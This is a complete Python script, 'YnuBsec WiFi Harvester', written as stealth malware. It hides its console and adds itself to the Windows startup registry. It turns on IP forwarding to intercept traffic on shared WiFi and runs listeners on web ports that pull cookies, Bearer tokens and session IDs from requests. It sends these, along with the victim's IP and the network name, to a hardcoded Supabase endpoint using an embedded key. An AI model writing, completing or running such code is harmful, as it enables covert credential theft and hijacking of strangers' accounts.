#!/usr/bin/env python3
"""
YnuBsec WiFi Harvester - Stealth Background Mode
No console, runs as background process
"""

import socket
import threading
import re
import urllib.request
import json
import time
import os
import subprocess
import sys
import ctypes

# Hide console window on Windows
if sys.platform == 'win32':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Configuration
SUPABASE_URL = 'https://bljzczucifemikxrvkkm.supabase.co/rest/v1/cookies'
SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJsanpjenVjaWZlbWlreHJ2a2ttIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MjIxODAsImV4cCI6MjA4OTQ5ODE4MH0.R_sPF74xdjLz-n13WUlqZbqDbKY03Yveegea_MzZHT4'

# Log file for debugging (optional)
LOG_FILE = os.path.join(os.environ['TEMP'], 'ynubsec.log')

def log_debug(message):
    """Write debug info to temp file (optional)"""
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
    except:
        pass

def get_wifi_ssid():
    """Get current WiFi SSID (Windows)"""
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                              capture_output=True, text=True, timeout=2,
                              creationflags=subprocess.CREATE_NO_WINDOW)
        for line in result.stdout.split('\n'):
            if 'SSID' in line and 'BSSID' not in line:
                return line.split(':')[1].strip()
    except:
        pass
    return 'Unknown'

def send_to_supabase(payload):
    """Send captured data to Supabase"""
    try:
        req = urllib.request.Request(
            SUPABASE_URL,
            data=json.dumps(payload).encode(),
            method='POST'
        )
        req.add_header('apikey', SUPABASE_KEY)
        req.add_header('Authorization', f'Bearer {SUPABASE_KEY}')
        req.add_header('Content-Type', 'application/json')
        
        response = urllib.request.urlopen(req, timeout=3)
        log_debug(f"Sent: {payload.get('src_ip', 'Unknown')}")
        return True
    except Exception as e:
        log_debug(f"Error sending: {e}")
        return False

def http_proxy(port):
    """HTTP/HTTPS Proxy to intercept traffic"""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', port))
        server.listen(100)
        log_debug(f"Proxy listening on port {port}")
        
        while True:
            try:
                client, addr = server.accept()
                data = client.recv(16384).decode(errors='ignore')
                
                # Extract cookies
                cookies = re.findall(r'Cookie:\s*([^\r\n]*)', data, re.IGNORECASE)
                # Extract authorization tokens
                tokens = re.findall(r'Authorization:\s*Bearer\s*([^\s\r\n]*)', data, re.IGNORECASE)
                # Extract session IDs
                sessions = re.findall(r'(?:PHPSESSID|session)=([^\s;&]*)', data, re.IGNORECASE)
                # Extract user agent
                ua = re.findall(r'User-Agent:\s*([^\r\n]*)', data, re.IGNORECASE)
                
                if cookies or tokens or sessions:
                    payload = {
                        'cookies': cookies[0] if cookies else '',
                        'tokens': tokens[0] if tokens else '',
                        'session_id': sessions[0] if sessions else '',
                        'src_ip': str(addr[0]),
                        'user_agent': ua[0] if ua else 'Windows',
                        'wifi_ssid': get_wifi_ssid(),
                        'timestamp': str(time.time())
                    }
                    threading.Thread(target=send_to_supabase, args=(payload,)).start()
                
                # Send response
                client.send(b'HTTP/1.1 200 OK\r\n\r\n')
                client.close()
                
            except Exception:
                continue
                
    except Exception as e:
        log_debug(f"Error on port {port}: {e}")

def enable_forwarding():
    """Enable IP forwarding for MITM"""
    try:
        if sys.platform == 'win32':
            subprocess.run(['netsh', 'interface', 'ip', 'set', 'interface', 'Wi-Fi', 'forwarding=enabled'], 
                         capture_output=True, timeout=2,
                         creationflags=subprocess.CREATE_NO_WINDOW)
            log_debug("IP Forwarding enabled")
    except:
        pass

def add_to_startup():
    """Add to Windows startup registry"""
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        winreg.SetValueEx(key, "YnuBsecHarvester", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        log_debug("Added to startup")
    except Exception as e:
        log_debug(f"Startup add failed: {e}")

def main():
    """Main entry point - Runs silently"""
    log_debug("YnuBsec Harvester Started")
    
    # Add to startup
    add_to_startup()
    
    # Enable forwarding
    enable_forwarding()
    
    # Start proxies on multiple ports
    ports = [80, 443, 8080, 8443]
    for port in ports:
        thread = threading.Thread(target=http_proxy, args=(port,), daemon=True)
        thread.start()
    
    log_debug("Harvesters running in background")
    
    # Keep running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log_debug("Harvester stopped")
        sys.exit(0)

if __name__ == "__main__":
    main()